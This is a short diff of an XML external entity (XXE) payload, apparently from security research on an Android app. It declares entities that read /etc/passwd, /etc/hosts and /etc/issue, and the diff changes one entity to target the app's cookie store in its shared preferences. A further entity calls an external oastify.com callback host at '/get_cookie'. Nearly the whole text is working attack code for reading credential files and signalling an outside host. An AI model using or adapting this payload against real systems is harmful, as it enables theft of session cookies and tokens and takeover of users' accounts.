@@ -3,7 +3,7 @@
 <!ENTITY passwd SYSTEM "file:///etc/passwd">
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
-<!ENTITY cookie SYSTEM "file:///data/data/com.ss.android.ugc.aweme/shared_prefs/token_shared_preference.xml">
+<!ENTITY cookie SYSTEM "file:///data/data/com.ss.android.ugc.aweme/shared_prefs/cookieStore.xml">
 <!ENTITY getcookie SYSTEM "http://1kms4buf8amdkbf9c37m5j1s9jfb31rq.oastify.com/get_cookie">
 ]> 
 <p>
